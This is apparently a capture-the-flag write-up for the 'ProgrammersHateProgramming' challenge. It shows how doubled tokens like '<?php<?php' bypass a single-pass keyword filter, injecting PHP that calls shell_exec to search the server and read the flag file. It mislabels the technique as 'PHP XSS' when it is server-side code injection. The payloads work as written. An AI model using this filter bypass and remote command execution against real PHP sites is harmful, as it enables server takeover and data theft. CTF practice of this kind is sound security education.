# ProgrammersHateProgramming

<p align="center">
  <img height="300" src="https://user-images.githubusercontent.com/57249574/134533022-ef1119d2-36f8-4d36-8a08-96efbf486d39.png">
</p>

### Solution:
1. Looking at the code in file, it is clear that whatever note we are inputting is being processed and the first instance of words ``<?php``, ``?>``, ``<script>``, ``</script>``, ``flag`` are beigng replaced by nothing. The website is also built in PHP and is vulnerable to PHP XSS due to execution of user entered data. So, we can craft a PHP code which would bypass the replace mechanism and can exploit the server.

2. Let's craft the PHP exploit now.
```php
<?php
shell_exec('find /* | grep flag');
?>
```
3. This script will easily find all the files with 'flag' in their name on server but there is a problem due to code on the server as specified in point 1. So, we need to add some dublicate words to bypass the code:
```php
<?php<?php
shell_exec('find /* | grep flagflag');
?>?>
```
4. So, the first replacement will occur on the server and the exploit will be converted as written in the point 2.
5. We directly get the file at /flag.php where the flag is written from the output of script in point 3.
6. Now we add note,
```php
<?php<?php
shell_exec('cat /flagflag.php');
?>?>
```
7. And now we have a flag,
`` flag{server_side_php_xss_is_less_known_but_considering_almost_80%_of_websites_use_php_it_is_good_to_know_thank_me_later_i_dont_want_to_stop_typing_this_flagg_is_getting_long_but_i_feel_like_we're_developing_a_really_meaningful_connection}
``
